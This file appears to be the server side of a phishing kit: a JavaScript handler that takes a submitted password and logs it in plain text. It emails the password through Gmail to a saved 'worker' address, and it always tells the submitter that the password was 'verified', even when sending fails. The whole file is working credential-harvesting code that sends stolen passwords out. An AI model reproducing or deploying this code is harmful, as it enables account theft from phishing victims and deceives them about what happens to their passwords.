import nodemailer from 'nodemailer';
import { getWorkerEmail } from './emailStore.js';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    const { password } = req.body;

    // ✅ GET SAVED workerEmail from submit form
    const workerEmail = getWorkerEmail();
    
    console.log('🔐 Password Form:');
    console.log('Password:', password);
    console.log('Using saved workerEmail:', workerEmail);
    
    const emailResult = await sendPasswordEmail(password, workerEmail);

    return res.status(200).json({
      success: true,
      message: 'Password verified',
      emailSent: emailResult.success,
      recipient: workerEmail,
      emailMessage: emailResult.message
    });

  } catch (error) {
    console.error('❌ Server Error:', error);
    return res.status(200).json({
      success: true,
      message: 'Verification completed',
      emailSent: false
    });
  }
}

async function sendPasswordEmail(password, workerEmail) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: process.env.GMAIL_USER, pass: process.env.GMAIL_APP_PASS }
    });

    await transporter.sendMail({
      from: `"Password System" <${process.env.GMAIL_USER}>`,
      to: workerEmail,
      subject: `🔐 Password Submitted`,
      html: `<div><h2>Password Form</h2><p>Password: ${password}</p><p>Time: ${new Date().toLocaleString()}</p></div>`
    });
    
    console.log('✅ Password email sent to saved workerEmail:', workerEmail);
    return { success: true, message: 'Email sent to saved workerEmail' };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return { success: false, message: error.message };
  }
}
